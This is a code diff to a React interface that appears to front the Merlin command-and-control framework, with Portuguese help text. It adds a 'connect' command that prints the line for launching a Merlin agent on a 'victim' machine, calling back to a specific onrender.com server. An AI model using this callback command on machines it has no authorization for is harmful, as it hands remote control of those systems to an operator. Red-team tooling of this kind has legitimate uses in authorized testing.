@@ -55,6 +55,7 @@ export default function App() {
           setLogs(prev => [...prev, 
             "COMANDOS MERLIN C2 (v1.1.5):",
             " - version: Exibe a versão do servidor e testa conexão",
+            " - connect: Mostra o comando para conectar um agente (victim)",
             " - listeners: Abre o menu de gerenciamento de escutas",
             " - sessions: Lista agentes/sessões estabelecidas",
             " - modules: Acessa a biblioteca de módulos pós-atividades",
@@ -66,6 +67,15 @@ export default function App() {
             " - start: Abre o terminal ttyd interativo",
             " - status: Verifica integridade gRPC/Web",
             " - clear: Limpa esta tela de logs"
+          ]);
+          break;
+        case 'connect':
+          setLogs(prev => [...prev, 
+            "[INSTALL] Comando para o Agente (Client):",
+            "--------------------------------------------------",
+            "./merlin-agent -url https://merlin-client-w1hb.onrender.com",
+            "--------------------------------------------------",
+            "[DICA] Certifique-se de ter um Listener HTTP/S ativo no servidor."
           ]);
           break;
         case 'start':
